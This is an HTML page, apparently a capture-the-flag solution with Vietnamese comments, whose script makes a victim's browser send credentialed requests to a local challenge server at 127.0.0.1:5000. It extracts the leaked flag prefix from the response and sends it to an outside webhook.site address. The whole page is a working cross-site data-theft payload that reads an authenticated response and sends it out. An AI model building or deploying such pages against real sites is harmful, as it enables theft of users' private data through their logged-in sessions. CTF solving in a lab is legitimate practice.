<!DOCTYPE html>
<html>
<head><title>Leak Page</title></head>
<body>
<script>
(async () => {
  // Gửi POST guess + note tới localhost để set cookie 'best'
  await fetch('http://127.0.0.1:5000/guess', {
    method: 'POST',
    credentials: 'include',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      guess: 'NHNC{',
      note: 'your_note_here' // note tùy ý, có thể để trống hoặc hex string
    })
  });

  // Lấy nội dung /inner.html (có best-prefix chứa phần flag)
  const res = await fetch('http://127.0.0.1:5000/inner.html', { credentials: 'include' });
  const html = await res.text();

  // Dùng regex lấy best-prefix (đoạn flag bị leak)
  const prefix = html.match(/<span id="best-prefix">(.*?)<\/span>/)[1];

  // Gửi prefix ra webhook ngoài để bạn xem
  await fetch('http://webhook.site/b5ea932e-efd5-4d15-88bc-96f61cc8527a?flag=' + encodeURIComponent(prefix));
})();
</script>
</body>
</html>
